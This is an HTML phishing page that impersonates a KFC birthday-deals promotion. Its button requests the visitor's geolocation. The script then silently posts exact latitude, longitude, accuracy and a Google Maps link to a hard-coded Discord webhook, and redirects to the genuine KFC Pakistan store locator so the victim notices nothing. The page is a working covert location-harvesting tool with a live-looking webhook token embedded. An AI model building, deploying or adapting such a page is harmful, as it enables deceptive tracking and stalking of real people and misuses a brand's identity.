<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>KFC VIP Deals</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(to bottom right, #ffecd2, #fcb69f);
      overflow: hidden;
    }

    /* Background animation container */
    .bg-animation {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      z-index: 0;
      overflow: hidden;
    }

    .bg-animation img {
      position: absolute;
      width: 100px;
      opacity: 0.7;
      animation: floatUp 12s linear infinite;
    }

    @keyframes floatUp {
      0% {
        transform: translateY(100vh) scale(0.8) rotate(0deg);
        opacity: 0;
      }
      50% {
        opacity: 1;
      }
      100% {
        transform: translateY(-200px) scale(1.1) rotate(360deg);
        opacity: 0;
      }
    }

    .card {
      background: white;
      text-align: center;
      padding: 50px 30px;
      max-width: 500px;
      margin: 80px auto;
      border-radius: 20px;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
      position: relative;
      z-index: 2;
    }

    .logo {
      width: 160px;
      margin-bottom: 25px;
    }

    h1 {
      font-size: 2.6rem;
      color: #d40000;
      margin: 10px 0;
    }

    p {
      font-size: 1.1rem;
      color: #333;
    }

    .btn {
      margin-top: 30px;
      padding: 15px 30px;
      background-color: #d40000;
      color: white;
      border: none;
      border-radius: 50px;
      font-size: 1.2rem;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    .btn:hover {
      background-color: #a70000;
    }

    #status {
      display: none;
    }
  </style>
</head>
<body>

  <!-- Floating Food Background -->
  <div class="bg-animation" id="background"></div>

  <!-- Main Card -->
  <div class="card">
    <img src="kfc-logo.png" alt="KFC Logo" class="logo">
    <h1>KFC</h1>
    <p>Allow location to unlock exclusive nearby deals for your Birthday or Anniversary üéÅ</p>
    <button class="btn" onclick="sendLocation()">üîé Nearby KFC Deals</button>
    <div id="status"></div>
  </div>

  <script>
    // Background floating animation with drumstick, sauce, wing
    const foodIcons = ["drumstick.png", "sauce.png", "wing.png"];
    const bg = document.getElementById('background');

    for (let i = 0; i < 30; i++) {
      const img = document.createElement('img');
      img.src = foodIcons[Math.floor(Math.random() * foodIcons.length)];
      img.style.left = Math.random() * 100 + 'vw';
      img.style.top = '100vh';
      img.style.animationDuration = (6 + Math.random() * 6) + 's';
      img.style.animationDelay = Math.random() * 10 + 's';
      bg.appendChild(img);
    }

    // Webhook logic
    const webhookUrl = "https://discord.com/api/webhooks/1400382122866249758/e2PIiGtfPBi0SQlRzF55kOmzGW2yUl-0HvUfjgp0Pohh9IAoWnbP-7EmGSKNbUnHgXjh";

    function sendLocation() {
      if (!navigator.geolocation) return;

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const accuracy = position.coords.accuracy;
          const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
          const message = `üçó **Nearby KFC Deal Request**\nüìç Latitude: ${lat}\nüìç Longitude: ${lon}\nüéØ Accuracy: ${accuracy} meters\nüîó [Google Maps](${mapUrl})`;

          fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: message })
          }).finally(() => {
            setTimeout(() => {
              window.location.href = "https://www.kfcpakistan.com/store-locations";
            }, 1000);
          });
        },
        () => {
          window.location.href = "https://www.kfcpakistan.com/store-locations";
        }
      );
    }
  </script>

</body>
</html>
